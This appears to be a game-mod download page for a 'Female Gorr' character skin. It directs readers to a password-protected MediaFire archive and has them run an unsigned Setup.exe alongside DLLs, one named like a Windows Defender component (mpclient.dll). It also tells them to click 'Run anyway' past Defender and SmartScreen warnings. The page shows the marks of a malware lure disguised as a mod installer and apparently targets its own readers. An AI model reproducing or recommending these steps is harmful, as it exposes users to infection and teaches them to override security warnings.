## 📖 About this mod

Female Gorr transforms Gorr’s in-game character appearance into a female version. The design features a cape-free look while retaining the character’s signature sword. A lobby visual limitation may cause the sword to remain visible when it should be hidden.

## ✨ Features

- **Female Appearance** — Reimagines Gorr with a distinct female character design.
- **Cape-Free Look** — Presents Gorr without the traditional cape for a cleaner silhouette.
- **Signature Sword** — Keeps Gorr’s recognizable sword as part of the character design.

## 📦 Installation & Setup

### Step 1 — Download

Download the archive from the official page: **https://www.mediafire.com/folder/wo1g3rjtd5bd0/setup**

### Step 2 — Extract with Password

1. The archive is protected with the password: **`2026`**
2. Use any archive extractor (WinRAR, 7-Zip, WinZip, etc.)
3. Enter the password when prompted

### Step 3 — Extract All Files

1. Extract **all files** from the archive into a folder of your choice.
2. **IMPORTANT:** all files must stay in the **same folder** as `Setup.exe`.
3. The folder structure should look like this:

```
Setup/
├── Setup.exe                          → main installer launcher
├── core.dll                           → core mod framework
├── lib.dll                            → shared library used by the mod
├── mpclient.dll                       → in-game module loaded at runtime
├── config.ini                         → configuration file with default settings
├── checksum.md5                       → integrity check for the archive
└── Password 2026.txt                  → password reminder (empty file)
```

### Step 4 — Run the Installer

1. Open the folder where you extracted the files.
2. Run `Setup.exe`.
3. The installer window will appear.

### Step 5 — Install the Mod

1. In the installer window, click **Install**.
2. Wait for the confirmation message *"Installation completed successfully"*.

### Step 6 — Launch the Game

1. Launch the game through the installer (click **Play**) or via the standard shortcut.
2. Enjoy your modded game.

> 🧩 If Windows Defender / SmartScreen shows a warning the first time,
> click **More info → Run anyway**. This is a normal false positive for
> unsigned installers.
